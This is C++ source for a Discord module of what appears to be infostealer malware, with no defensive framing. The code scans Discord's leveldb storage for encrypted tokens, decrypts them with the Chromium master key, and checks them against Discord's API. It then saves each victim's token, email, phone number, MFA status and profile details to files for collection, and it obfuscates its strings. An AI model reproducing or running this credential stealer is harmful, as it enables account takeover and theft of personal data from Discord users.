#include "Discord.h"
#include <future>
#include <unordered_set>

void Discord::execute(fs::path &root) {
    auto tokens = this->getTokens();
    std::vector<std::future<void>> futures;

    for(const std::string& token : tokens)
    {
        fs::path discordRoot = root / xorstr_("Discord");
        futures.push_back(std::async(std::launch::async, [this, token, discordRoot]() {
            writeTokenInfo(token, discordRoot);
        }));
    }

    for(auto &f : futures)
    {
        f.get();
    }
}

void Discord::writeTokenInfo(const std::string& token, const fs::path& root) {
    std::pair<std::string, int> request = HttpUtil::sendHttpRequest("https://discordapp.com/api/v6/users/@me", {
            {"Content-Type", "application/json"},
            {"User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"},
            {"Authorization", token}
    });

    if(request.second != 200)
        return;

    json resp = json::parse(request.first);
    std::ostringstream ss;

    try
    {
        ss << "TOKEN: " << token << "\n\n";
        ss << "ID: " << resp["id"].get<std::string>() << "\n";
        ss << "USERNAME: " << resp["username"].get<std::string>() << "\n";
        ss << "GLOBAL NAME: " << resp["global_name"].get<std::string>() << "\n";
        ss << "LOCALE: " << StringUtil::toUpperCase(resp["locale"].get<std::string>()) << "\n\n";
        ss << "VERIFIED: " << (resp["verified"].get<bool>() ? "Yes" : "No") << "\n";
        ss << "EMAIL: " << resp["email"].get<std::string>() << "\n";

        ss << "PHONE: " << resp.value("phone", "Unknown") << "\n\n";
        ss << "NSFW ALLOWED: " << (resp["nsfw_allowed"].get<bool>() ? "Yes" : "No") << "\n\n";
        ss << "MFA ENABLED: " << (resp["mfa_enabled"].get<bool>() ? "Yes" : "No") << "\n\n";
        ss << "NITRO: " << (resp["premium_type"].get<int>() == 1 ? "Yes" : "No") << "\n";

        std::string bio = StringUtil::replace(resp["bio"].get<std::string>(), "\n", " ");
        if(!bio.empty())
        {
            ss << "\nBIO: " << bio;
        }

        Utils::writeFile(root / (resp["username"].get<std::string>() + ".txt"), ss.str());
    }
    catch (...)
    {
        Utils::writeFile(root / "Other tokens.txt", token + "\n", true);
    }
}

std::vector<std::string> Discord::getTokens() {
    std::unordered_set<std::string> tokens;

    for(const fs::path& path : this->discord_paths)
    {
        auto scannedTokens = this->getToken(const_cast<fs::path &>(path));
        tokens.insert(scannedTokens.begin(), scannedTokens.end());
    }

    return std::vector<std::string>(tokens.begin(), tokens.end());
}

std::vector<std::string> Discord::getToken(fs::path &root) {
    if(!exists(root))
        return {};

    std::vector<BYTE> masterKey = ChromiumUtil::getMasterKey(root);
    if(masterKey.empty())
        return {};

    return this->scanToken(root, masterKey);
}

std::vector<std::string> Discord::scanToken(fs::path &root, const std::vector<BYTE>& master_key) {
    std::unordered_set<std::string> tokens;

    fs::path scan_path = root / "Local Storage" / "leveldb";
    std::regex token_regex(R"(dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*)");

    if (fs::exists(scan_path) && fs::is_directory(scan_path)) {
        for (const fs::path &entry : fs::directory_iterator(scan_path)) {
            if(!(entry.filename().string().ends_with(".ldb") || entry.filename().string().ends_with(".log")))
                continue;

            std::string content = Utils::readFile(entry);
            if(content.empty())
                continue;

            std::smatch match;
            while (std::regex_search(content, match, token_regex)) {
                std::string unformatted_token = match.str(0);
                unformatted_token = unformatted_token.substr(unformatted_token.find("dQw4w9WgXcQ:") + 12);
                std::vector<BYTE> decoded_token(Base64Util::b64decode(unformatted_token));
                std::string decryptedToken = ChromiumUtil::decryptData(decoded_token, master_key);
                tokens.insert(decryptedToken);

                content = match.suffix().str();
            }
        }
    }

    return std::vector<std::string>(tokens.begin(), tokens.end());
}
